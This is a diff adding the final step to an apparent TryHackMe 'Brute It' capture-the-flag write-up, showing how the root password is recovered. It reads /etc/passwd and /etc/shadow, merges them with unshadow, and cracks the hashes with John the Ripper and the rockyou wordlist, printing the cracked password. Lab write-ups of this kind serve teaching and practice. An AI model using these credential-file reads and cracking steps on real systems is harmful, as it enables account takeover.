@@ -284,6 +284,27 @@ THM{ZZXXXZZXXXZZXXXZZXXXZZXXXZZXXX}
 john@bruteit:~$
 ```
 
+There is one last task left to do.  Discover the **root** `password`.
+
+Let's use the `cat` command to get the `/etc/passwd` and `/etc/shadow` files on our machine to crack the password again using `JohnTheRipper`.
+
+This time, we can use the `unshadow` command to prepare a file for `John`:
+
+```shell
+unshadow passwd.txt shadow.txt > pass.txt
+```
+
+Now let's 'John' crack the file:
+
+```shell
+john --wordlist=/usr/share/wordlist/rockyou.txt pass.txt
+
+john --show pass.txt
+root:football:0:0:root:/root:/bin/bash
+```
+
+There it is! The **root password** is `football`
+
 ## COMPLETED
 
 ![Completed!](./_attachment/THM_Brute-It_header2.png)
